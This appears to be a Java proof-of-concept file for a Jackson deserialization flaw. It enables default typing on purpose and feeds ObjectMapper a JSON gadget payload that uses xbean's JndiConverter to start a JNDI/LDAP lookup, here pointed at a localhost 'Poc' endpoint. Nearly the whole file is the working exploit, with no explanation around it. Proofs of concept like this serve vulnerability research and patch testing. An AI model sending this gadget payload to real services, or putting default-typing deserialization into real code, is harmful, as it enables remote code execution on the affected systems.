import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * Title: Main
 * Descrption: TODO
 * Date:2020/2/28 12:27 下午
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class Main {

    public static void main(String[] args) {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1099/Poc\"}]";
        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
